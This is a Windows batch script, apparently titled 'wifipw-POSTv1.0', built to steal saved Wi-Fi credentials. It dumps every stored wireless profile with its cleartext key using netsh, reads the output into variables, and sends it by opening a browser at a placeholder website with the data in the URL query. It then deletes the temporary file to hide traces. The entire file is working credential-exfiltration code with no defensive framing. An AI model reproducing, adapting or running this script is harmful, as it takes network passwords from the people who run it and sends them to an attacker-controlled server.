@echo off && color a && cls && TITLE wifipw-POSTv1.0 by Whiteavocado and reveloperboy
netsh wlan show profile * key=clear>>%tmp%\wifi.url
::vars: website url and echo off or on.
set "website=HTTPS://WEBSITE.COM"
set "echoquestion=off"
::
::
::
if %echoquestion% == off goto off
if %echoquestion% == on goto on
:off
@echo off
set "echowifi=off"
goto setlines
:on
@echo on
set "echowifi=off"
goto setlines
echo error!
set /p "end="
exit


:setlines
(
set /p line1=
set /p line2=
set /p line3=
set /p line4=
set /p line5=
set /p line6=
set /p line7=
set /p line8=
set /p line9=
set /p line10=
set /p line11=
set /p line12=
set /p line13=
set /p line14=
set /p line15=
set /p line16=
set /p line17=
set /p line18=
set /p line19=
set /p line20=
set /p line21=
set /p line22=
set /p line23=
set /p line24=
set /p line25=
set /p line26=
set /p line27=
set /p line28=
set /p line29=
set /p line30=
set /p line31=
set /p line32=
set /p line33=
set /p line34=
set /p line35=
set /p line36=
set /p line37=
set /p line38=
set /p line39=
set /p line40=
set /p line41=
set /p line42=
set /p line43=
set /p line44=
set /p line45=
set /p line46=
set /p line47=
set /p line48=
set /p line49=
set /p line50=
set /p line51=
set /p line52=
set /p line53=
set /p line54=
set /p line55=
set /p line56=
set /p line57=
set /p line58=
set /p line59=
set /p line60=
set /p line61=
set /p line62=
set /p line63=
set /p line64=
set /p line65=
set /p line66=
set /p line67=
set /p line68=
set /p line69=
set /p line70=
set /p line71=
set /p line72=
set /p line73=
set /p line74=
set /p line75=
set /p line76=
set /p line77=
set /p line78=
set /p line79=
set /p line80=
set /p line81=
set /p line82=
set /p line83=
set /p line84=
set /p line85=
set /p line86=
set /p line87=
set /p line88=
set /p line89=
set /p line90=
set /p line91=
set /p line92=
set /p line93=
set /p line94=
set /p line95=
set /p line96=
set /p line97=
set /p line98=
set /p line99=
set /p line100=
set /p line101=
set /p line102=
set /p line103=
set /p line104=
set /p line105=
set /p line106=
set /p line107=
set /p line108=
set /p line109=
set /p line110=
set /p line111=
set /p line112=
set /p line113=
set /p line114=
set /p line115=
set /p line116=
set /p line117=
set /p line118=
set /p line119=
set /p line120=
set /p line121=
set /p line122=
set /p line123=
set /p line124=
set /p line125=
set /p line126=
set /p line127=
set /p line128=
set /p line129=
set /p line130=
set /p line131=
set /p line132=
set /p line133=
set /p line134=
set /p line135=
set /p line136=
set /p line137=
set /p line138=
set /p line139=
set /p line140=
set /p line141=
set /p line142=
set /p line143=
set /p line144=
set /p line145=
set /p line146=
set /p line147=
set /p line148=
set /p line149=
set /p line150=
set /p line151=
set /p line152=
set /p line153=
set /p line154=
set /p line155=
set /p line156=
set /p line157=
set /p line158=
set /p line159=
set /p line160=
set /p line161=
set /p line162=
set /p line163=
set /p line164=
set /p line165=
set /p line166=
set /p line167=
set /p line168=
set /p line169=
set /p line170=
set /p line171=
set /p line172=
set /p line173=
set /p line174=
set /p line175=
set /p line176=
set /p line177=
set /p line178=
set /p line179=
set /p line180=
set /p line181=
set /p line182=
set /p line183=
set /p line184=
set /p line185=
set /p line186=
set /p line187=
set /p line188=
set /p line189=
set /p line190=
set /p line191=
set /p line192=
set /p line193=
set /p line194=
set /p line195=
set /p line196=
set /p line197=
set /p line198=
set /p line199=
set /p line200=
)<%tmp%\wifi.url

set "wifi=%line1%%line2%%line3%%line4%%line5%%line6%%line7%%line8%%line9%%line10%%line11%%line12%%line13%%line14%%line15%%line16%%line17%%line18%%line19%%line20%%line21%%line22%%line23%%line24%%line25%%line26%%line27%%line28%%line29%%line30%%line31%%line32%%line33%%line34%%line35%%line36%%line37%%line38%%line39%%line40%%line41%%line42%%line43%%line44%%line45%%line46%%line47%%line48%%line49%%line50%%line51%%line52%%line53%%line54%%line55%%line56%%line57%%line58%%line59%%line60%%line61%%line62%%line63%%line64%%line65%%line66%%line67%%line68%%line69%%line70%%line71%%line72%%line73%%line74%%line75%%line76%%line77%%line78%%line79%%line80%%line81%%line82%%line83%%line84%%line85%%line86%%line87%%line88%%line89%%line90%%line91%%line92%%line93%%line94%%line95%%line96%%line97%%line98%%line99%%line100%"
if %echowifi% == on echo %wifi%
start %website%/?"%wifi%"
del %tmp%\wifi.url
exit
